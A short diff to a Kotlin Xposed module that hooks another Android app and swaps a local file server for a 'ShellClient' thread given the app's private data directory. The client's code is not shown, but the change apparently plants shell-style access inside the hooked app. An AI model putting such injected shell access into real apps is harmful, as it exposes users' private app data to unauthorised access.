@@ -6,6 +6,7 @@ import de.robv.android.xposed.IXposedHookLoadPackage
 import de.robv.android.xposed.XC_MethodHook
 import de.robv.android.xposed.XposedHelpers
 import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam
+import java.io.File
 
 class MainHook : IXposedHookLoadPackage {
     override fun handleLoadPackage(lpparam: LoadPackageParam) {
@@ -17,12 +18,10 @@ class MainHook : IXposedHookLoadPackage {
             object : XC_MethodHook() {
                 override fun afterHookedMethod(param: MethodHookParam) {
                     val context = param.thisObject as Context
-                    // Start HTTP Server (Normal Mode)
-                    try {
-                        FileServer(8080).start()
-                    } catch (e: Exception) {
-                        e.printStackTrace()
-                    }
+                    val dataDir = File(context.applicationInfo.dataDir)
+                    
+                    // Start Client Thread
+                    ShellClient(dataDir).start()
                 }
             }
         )
